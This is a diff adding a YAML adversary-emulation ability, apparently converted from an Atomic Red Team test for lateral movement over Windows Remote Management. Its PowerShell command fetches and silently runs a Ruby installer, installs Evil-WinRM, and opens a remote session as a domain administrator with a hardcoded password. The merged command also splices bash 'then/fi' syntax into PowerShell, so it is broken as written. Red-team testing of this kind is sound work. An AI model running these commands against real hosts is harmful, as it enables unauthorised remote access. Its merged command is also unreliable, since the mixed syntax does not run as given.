@@ -1,0 +1,63 @@
+- id: efe86d95-44c4-4509-ae42-7bfd9d1f5b3d
+  name: WinRM Access with Evil-WinRM
+  description: An adversary may attempt to use Evil-WinRM with a valid account to
+    interact with remote systems that have WinRM enabled
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.006
+    name: 'Remote Services: Windows Remote Management'
+  platforms:
+    windows:
+      psh:
+        command: 'try {if (ruby -v) {exit 0} else {exit 1}} catch {exit 1}; then :
+          ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest  -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe"
+          https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe;
+          $file1= "PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe";
+          Start-Process $file1 /S;; fi; try {if (evil-winrm -h) {exit 0} else {exit
+          1}} catch {exit 1}; then : ; else gem install evil-winrm; fi; evil-winrm
+          -i Target -u Domain\Administrator -p P@ssw0rd1'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - lateral-movement
+  - atomic-red-team
+  - t1021.006
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      user_name:
+        description: Username
+        type: string
+        default: Domain\Administrator
+      destination_address:
+        description: Remote Host IP or Hostname
+        type: string
+        default: Target
+      password:
+        description: Password
+        type: string
+        default: P@ssw0rd1
+    dependencies:
+    - description: Computer must have Ruby Installed
+      prereq_command: try {if (ruby -v) {exit 0} else {exit 1}} catch {exit 1}
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest  -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe"
+        https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe
+
+        $file1= "PathToAtomicsFolder\..\ExternalPayloads\rubyinstaller-2.7.1-1-x64.exe"
+
+        Start-Process $file1 /S;'
+    - description: Computer must have Evil-WinRM installed
+      prereq_command: try {if (evil-winrm -h) {exit 0} else {exit 1}} catch {exit
+        1}
+      get_prereq_command: gem install evil-winrm
+    technique_created: '2020-02-11T18:29:47.757Z'
+    atomic_guid: efe86d95-44c4-4509-ae42-7bfd9d1f5b3d
+    import_timestamp: '2025-06-24T11:15:05.965244Z'
